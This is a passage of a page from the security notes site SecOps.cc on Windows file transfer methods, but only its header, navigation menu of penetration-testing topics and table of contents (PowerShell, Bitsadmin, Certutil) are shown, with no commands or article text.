<!doctype html><html lang=en class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="SecOps.cc is an information security platform designed to cover various offensive & defensive security topics"><meta name=author content=dh><link href=https://secops.cc/file_transfers/methods/ rel=canonical><link rel=icon href=../../assets/favicon.png><meta name=generator content="mkdocs-1.3.1, mkdocs-material-8.1.4"><title>Methods - SecOps.cc</title><link rel=stylesheet href=../../assets/stylesheets/main.bb3983ee.min.css><link rel=stylesheet href=../../assets/stylesheets/palette.e6a45f82.min.css><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback"><style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style><script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script></head> <body dir=ltr data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo> <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)</script> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#windows-file-transfer-methods class=md-skip> Skip to content </a> </div> <div data-md-component=announce> </div> <header class=md-header data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=../.. title=SecOps.cc class="md-header__button md-logo" aria-label=SecOps.cc data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 89 89"> <path d=M3.136,17.387l0,42.932l42.932,21.467l-42.932,-64.399Z /> <path d=M21.91,8l42.933,64.398l-18.775,9.388l-42.932,-64.399l18.774,-9.387Z style="fill-opacity: 0.5"/> <path d=M67.535,17.387l-27.262,18.156l21.878,32.818l5.384,2.691l0,-53.665Z /> <path d=M67.535,17.387l0,53.666l18.774,-9.388l0,-53.665l-18.774,9.387Z style="fill-opacity: 0.25"/> </svg> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> SecOps.cc </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> Methods </span> </div> </div> </div> <form class=md-header__option data-md-component=palette> <input class=md-option data-md-color-media data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to dark mode" type=radio name=__palette id=__palette_1> <label class="md-header__button md-icon" title="Switch to dark mode" for=__palette_2 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3z"/></svg> </label> <input class=md-option data-md-color-media data-md-color-scheme=slate data-md-color-primary=red data-md-color-accent=red aria-label="Switch to light mode" type=radio name=__palette id=__palette_2> <label class="md-header__button md-icon" title="Switch to light mode" for=__palette_1 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg> </label> </form> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=Search placeholder=Search autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </label> <nav class=md-search__options aria-label=Search> <a href=javascript:void(0) class="md-search__icon md-icon" aria-label=Share data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08z"/></svg> </a> <button type=reset class="md-search__icon md-icon" aria-label=Clear tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> Initializing search </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/hrmnsio/SecOps title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> hrmnsio/SecOps </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <nav class=md-tabs aria-label=Tabs data-md-component=tabs> <div class="md-tabs__inner md-grid"> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../.. class=md-tabs__link> Home </a> </li> <li class=md-tabs__item> <a href=../../docs/ class="md-tabs__link md-tabs__link--active"> Docs </a> </li> <li class=md-tabs__item> <a href=../../blog/ class=md-tabs__link> Blog </a> </li> </ul> </div> </nav> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../.. title=SecOps.cc class="md-nav__button md-logo" aria-label=SecOps.cc data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 89 89"> <path d=M3.136,17.387l0,42.932l42.932,21.467l-42.932,-64.399Z /> <path d=M21.91,8l42.933,64.398l-18.775,9.388l-42.932,-64.399l18.774,-9.387Z style="fill-opacity: 0.5"/> <path d=M67.535,17.387l-27.262,18.156l21.878,32.818l5.384,2.691l0,-53.665Z /> <path d=M67.535,17.387l0,53.666l18.774,-9.388l0,-53.665l-18.774,9.387Z style="fill-opacity: 0.25"/> </svg> </a> SecOps.cc </label> <div class=md-nav__source> <a href=https://github.com/hrmnsio/SecOps title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> hrmnsio/SecOps </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../.. class=md-nav__link> Home </a> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2 type=checkbox id=__nav_2 checked> <div class="md-nav__link md-nav__link--index "> <a href=../../docs/ >Docs</a> <label for=__nav_2> <span class="md-nav__icon md-icon"></span> </label> </div> <nav class=md-nav aria-label=Docs data-md-level=1> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> Docs </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_2 type=checkbox id=__nav_2_2> <label class=md-nav__link for=__nav_2_2> Cheatsheets <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Cheatsheets data-md-level=2> <label class=md-nav__title for=__nav_2_2> <span class="md-nav__icon md-icon"></span> Cheatsheets </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_2_1 type=checkbox id=__nav_2_2_1> <label class=md-nav__link for=__nav_2_2_1> Pentesting/CTF <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Pentesting/CTF data-md-level=3> <label class=md-nav__title for=__nav_2_2_1> <span class="md-nav__icon md-icon"></span> Pentesting/CTF </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../cheat_sheets/cheatsheet-77/ class=md-nav__link> Commands </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/linux_shortcuts/ class=md-nav__link> Linux Shortcuts </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/windows/ class=md-nav__link> Windows </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/shells_payloads/ class=md-nav__link> Shells & Payloads </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/web_requests/ class=md-nav__link> Web requests </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/deobfuscation/ class=md-nav__link> (De)Obfuscation </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/brute_forcing/ class=md-nav__link> Brute Forcing </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/common_apps/ class=md-nav__link> Common Applications </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/web_attacks/ class=md-nav__link> Web Attacks </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/file_transfer/ class=md-nav__link> File Transfer </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/win_privesc/ class=md-nav__link> Windows Privilege Escalation </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/footprinting/ class=md-nav__link> Footprinting </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/cheatsheet_ptpf/ class=md-nav__link> Pivoting, Tunnel, Port Forwarding </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_2_2 type=checkbox id=__nav_2_2_2> <label class=md-nav__link for=__nav_2_2_2> Active Directory <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Active Directory" data-md-level=3> <label class=md-nav__title for=__nav_2_2_2> <span class="md-nav__icon md-icon"></span> Active Directory </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../cheat_sheets/cheatsheet_aid/ class=md-nav__link> IAD </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3 type=checkbox id=__nav_2_3> <label class=md-nav__link for=__nav_2_3> Active Directory <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Active Directory" data-md-level=2> <label class=md-nav__title for=__nav_2_3> <span class="md-nav__icon md-icon"></span> Active Directory </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_1 type=checkbox id=__nav_2_3_1> <label class=md-nav__link for=__nav_2_3_1> Intro <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Intro data-md-level=3> <label class=md-nav__title for=__nav_2_3_1> <span class="md-nav__icon md-icon"></span> Intro </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../active_directory/ad_fundamentals/ class=md-nav__link> Fundamentals </a> </li> <li class=md-nav__item> <a href=../../active_directory/ad_protocols/ class=md-nav__link> Protocols </a> </li> <li class=md-nav__item> <a href=../../active_directory/ad_users/ class=md-nav__link> All About Users </a> </li> <li class=md-nav__item> <a href=../../active_directory/ad_security/ class=md-nav__link> Security in Active Directory </a> </li> <li class=md-nav__item> <a href=../../active_directory/ad_gpo/ class=md-nav__link> Group Policy </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4 type=checkbox id=__nav_2_4 checked> <label class=md-nav__link for=__nav_2_4> Red Team <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Red Team" data-md-level=2> <label class=md-nav__title for=__nav_2_4> <span class="md-nav__icon md-icon"></span> Red Team </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_1 type=checkbox id=__nav_2_4_1> <label class=md-nav__link for=__nav_2_4_1> Footprinting <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Footprinting data-md-level=3> <label class=md-nav__title for=__nav_2_4_1> <span class="md-nav__icon md-icon"></span> Footprinting </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../footprinting/domain_information/ class=md-nav__link> Domain Information </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_1_2 type=checkbox id=__nav_2_4_1_2> <label class=md-nav__link for=__nav_2_4_1_2> Host Based Enumeration <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Host Based Enumeration" data-md-level=4> <label class=md-nav__title for=__nav_2_4_1_2> <span class="md-nav__icon md-icon"></span> Host Based Enumeration </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../footprinting/ftp/ class=md-nav__link> FTP </a> </li> <li class=md-nav__item> <a href=../../footprinting/smb/ class=md-nav__link> SMB </a> </li> <li class=md-nav__item> <a href=../../footprinting/nfs/ class=md-nav__link> NFS </a> </li> <li class=md-nav__item> <a href=../../footprinting/dns/ class=md-nav__link> DNS </a> </li> <li class=md-nav__item> <a href=../../footprinting/smtp/ class=md-nav__link> SMTP </a> </li> <li class=md-nav__item> <a href=../../footprinting/imap_pop3/ class=md-nav__link> IMAP/POP3 </a> </li> <li class=md-nav__item> <a href=../../footprinting/snmp/ class=md-nav__link> SNMP </a> </li> <li class=md-nav__item> <a href=../../footprinting/mysql/ class=md-nav__link> MySQL </a> </li> <li class=md-nav__item> <a href=../../footprinting/mssql/ class=md-nav__link> MSSQL </a> </li> <li class=md-nav__item> <a href=../../footprinting/ipmi/ class=md-nav__link> IPMI </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_1_3 type=checkbox id=__nav_2_4_1_3> <label class=md-nav__link for=__nav_2_4_1_3> Remote Management Protocols <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Remote Management Protocols" data-md-level=4> <label class=md-nav__title for=__nav_2_4_1_3> <span class="md-nav__icon md-icon"></span> Remote Management Protocols </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../footprinting/linux_remote_management_protocol/ class=md-nav__link> Linux </a> </li> <li class=md-nav__item> <a href=../../footprinting/windows_remote_management_protocol/ class=md-nav__link> Windows </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_2 type=checkbox id=__nav_2_4_2> <label class=md-nav__link for=__nav_2_4_2> OS Basics <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="OS Basics" data-md-level=3> <label class=md-nav__title for=__nav_2_4_2> <span class="md-nav__icon md-icon"></span> OS Basics </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_2_1 type=checkbox id=__nav_2_4_2_1> <label class=md-nav__link for=__nav_2_4_2_1> Basics Linux <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Basics Linux" data-md-level=4> <label class=md-nav__title for=__nav_2_4_2_1> <span class="md-nav__icon md-icon"></span> Basics Linux </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../basics_linux/linux/ class=md-nav__link> Linux </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_2_2 type=checkbox id=__nav_2_4_2_2> <label class=md-nav__link for=__nav_2_4_2_2> Basics Windows <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Basics Windows" data-md-level=4> <label class=md-nav__title for=__nav_2_4_2_2> <span class="md-nav__icon md-icon"></span> Basics Windows </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../basics_windows/windows/ class=md-nav__link> Windows </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_3 type=checkbox id=__nav_2_4_3> <label class=md-nav__link for=__nav_2_4_3> Pivoting, Tunneling, Port Forwarding <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Pivoting, Tunneling, Port Forwarding" data-md-level=3> <label class=md-nav__title for=__nav_2_4_3> <span class="md-nav__icon md-icon"></span> Pivoting, Tunneling, Port Forwarding </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../ptpf/basics/ class=md-nav__link> Basics </a> </li> <li class=md-nav__item> <a href=../../ptpf/starting_tunnels/ class=md-nav__link> Starting Tunnels </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_4 type=checkbox id=__nav_2_4_4> <label class=md-nav__link for=__nav_2_4_4> Privilege Escalation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Privilege Escalation" data-md-level=3> <label class=md-nav__title for=__nav_2_4_4> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_4_1 type=checkbox id=__nav_2_4_4_1> <label class=md-nav__link for=__nav_2_4_4_1> Windows PrivEsc <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows PrivEsc" data-md-level=4> <label class=md-nav__title for=__nav_2_4_4_1> <span class="md-nav__icon md-icon"></span> Windows PrivEsc </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/tools/ class=md-nav__link> Useful Tools </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_4_1_2 type=checkbox id=__nav_2_4_4_1_2> <label class=md-nav__link for=__nav_2_4_4_1_2> Getting the Lay of the Land <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Getting the Lay of the Land" data-md-level=5> <label class=md-nav__title for=__nav_2_4_4_1_2> <span class="md-nav__icon md-icon"></span> Getting the Lay of the Land </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/gtlotl/ class=md-nav__link> Situational Awareness </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/init_enum/ class=md-nav__link> Initial Enumeration </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/comm_with_ps/ class=md-nav__link> Communication with Processes </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_4_1_3 type=checkbox id=__nav_2_4_4_1_3> <label class=md-nav__link for=__nav_2_4_4_1_3> Windows User Privileges <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows User Privileges" data-md-level=5> <label class=md-nav__title for=__nav_2_4_4_1_3> <span class="md-nav__icon md-icon"></span> Windows User Privileges </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/seimpersonate_seassignprimarytoken/ class=md-nav__link> SeImpersonate and SeAssignPrimaryToken </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/sebugpriv/ class=md-nav__link> SeDebugPrivilege </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/setakeownershippriv/ class=md-nav__link> SeTakeOwnershipPrivilege </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_4_1_4 type=checkbox id=__nav_2_4_4_1_4> <label class=md-nav__link for=__nav_2_4_4_1_4> Windows Group Privileges <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows Group Privileges" data-md-level=5> <label class=md-nav__title for=__nav_2_4_4_1_4> <span class="md-nav__icon md-icon"></span> Windows Group Privileges </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/builtin_groups/ class=md-nav__link> Windows Built-in Groups </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/eventlog_readers/ class=md-nav__link> Event Log Readers </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/dnsadmins/ class=md-nav__link> DnsAdmins </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/hyperv_admins/ class=md-nav__link> Hyper-V Administrators </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/print_operators/ class=md-nav__link> Print Operators </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/server_operators/ class=md-nav__link> Server Operators </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_4_1_5 type=checkbox id=__nav_2_4_4_1_5> <label class=md-nav__link for=__nav_2_4_4_1_5> Attacking the OS <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Attacking the OS" data-md-level=5> <label class=md-nav__title for=__nav_2_4_4_1_5> <span class="md-nav__icon md-icon"></span> Attacking the OS </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/user_account_control/ class=md-nav__link> User Account Control </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/weak_permissions/ class=md-nav__link> Weak Permissions </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/kernel_exploits/ class=md-nav__link> Kernel Exploits </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/vulnerable_services/ class=md-nav__link> Vulnerable Services </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_4_1_6 type=checkbox id=__nav_2_4_4_1_6> <label class=md-nav__link for=__nav_2_4_4_1_6> Credential Theft <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Credential Theft" data-md-level=5> <label class=md-nav__title for=__nav_2_4_4_1_6> <span class="md-nav__icon md-icon"></span> Credential Theft </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/credential_hunting/ class=md-nav__link> Credential Hunting </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/other_files/ class=md-nav__link> Other Files </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/further_credential_theft/ class=md-nav__link> Further Credential Theft </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_4_1_7 type=checkbox id=__nav_2_4_4_1_7> <label class=md-nav__link for=__nav_2_4_4_1_7> Additional Techniques <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Additional Techniques" data-md-level=5> <label class=md-nav__title for=__nav_2_4_4_1_7> <span class="md-nav__icon md-icon"></span> Additional Techniques </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/interacting_with_users/ class=md-nav__link> Interacting with Users </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/miscellaneous_techniques/ class=md-nav__link> Miscellaneous Techniques </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_4_1_8 type=checkbox id=__nav_2_4_4_1_8> <label class=md-nav__link for=__nav_2_4_4_1_8> EOL Systems <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="EOL Systems" data-md-level=5> <label class=md-nav__title for=__nav_2_4_4_1_8> <span class="md-nav__icon md-icon"></span> EOL Systems </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/windows_server/ class=md-nav__link> Windows Server </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/windows_desktop/ class=md-nav__link> Windows Desktop </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_5 type=checkbox id=__nav_2_4_5 checked> <label class=md-nav__link for=__nav_2_4_5> File Transfers <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="File Transfers" data-md-level=3> <label class=md-nav__title for=__nav_2_4_5> <span class="md-nav__icon md-icon"></span> File Transfers </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle=toc type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> Methods <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> Methods </a> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#powershell-downloads class=md-nav__link> Powershell Downloads </a> </li> <li class=md-nav__item> <a href=#powershell-file-uploads class=md-nav__link> Powershell File Uploads </a> </li> <li class=md-nav__item> <a href=#bitsadmin class=md-nav__link> Bitsadmin </a> </li> <li class=md-nav__item> <a href=#certutil class=md-nav__link> Certutil </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_6 type=checkbox id=__nav_2_4_6> <label class=md-nav__link for=__nav_2_4_6> Networking <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Networking data-md-level=3> <label class=md-nav__title for=__nav_2_4_6> <span class="md-nav__icon md-icon"></span> Networking </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../networking/overview/ class=md-nav__link> Overview </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input 